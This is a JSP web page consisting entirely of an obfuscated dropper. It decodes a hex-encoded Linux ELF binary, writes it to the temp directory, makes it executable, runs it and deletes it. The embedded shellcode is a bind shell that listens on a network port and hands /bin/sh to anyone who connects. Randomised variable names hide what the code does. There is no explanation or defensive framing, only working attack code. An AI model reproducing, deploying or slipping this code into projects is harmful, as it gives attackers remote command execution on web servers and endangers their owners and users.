<%@ page import="java.io.*" %>
<%
  String nStyWwVCGm = "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000007000000000000000000000000004000000000000000400000000000ce00000000000000240100000000000000100000000000006a2958996a025f6a015e0f05489752c70424020020fb4889e66a105a6a31580f056a32580f054831f66a2b580f0548976a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05";
  String mwooRESuLw = System.getProperty("java.io.tmpdir") + "/IgyIuWLtxBY";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    mwooRESuLw = mwooRESuLw.concat(".exe");
  }

  int nxcIaihOwf = nStyWwVCGm.length();
  byte[] kVVRHuEcNeZhlrT = new byte[nxcIaihOwf/2];
  for (int phXMbdqDezK = 0; phXMbdqDezK < nxcIaihOwf; phXMbdqDezK += 2) {
    kVVRHuEcNeZhlrT[phXMbdqDezK / 2] = (byte) ((Character.digit(nStyWwVCGm.charAt(phXMbdqDezK), 16) << 4)
                                              + Character.digit(nStyWwVCGm.charAt(phXMbdqDezK+1), 16));
  }

  FileOutputStream xrhWtORhVWV = new FileOutputStream(mwooRESuLw);
  xrhWtORhVWV.write(kVVRHuEcNeZhlrT);
  xrhWtORhVWV.flush();
  xrhWtORhVWV.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] bylNQJGlruGB = new String[3];
    bylNQJGlruGB[0] = "chmod";
    bylNQJGlruGB[1] = "+x";
    bylNQJGlruGB[2] = mwooRESuLw;
    Process jnSUWtFYqfCv = Runtime.getRuntime().exec(bylNQJGlruGB);
    if (jnSUWtFYqfCv.waitFor() == 0) {
      jnSUWtFYqfCv = Runtime.getRuntime().exec(mwooRESuLw);
    }

    File gYvognZDEAdm = new File(mwooRESuLw); gYvognZDEAdm.delete();
  } else {
    String[] aDXBESebAx = new String[1];
    aDXBESebAx[0] = mwooRESuLw;
    Process jnSUWtFYqfCv = Runtime.getRuntime().exec(aDXBESebAx);
  }
%>
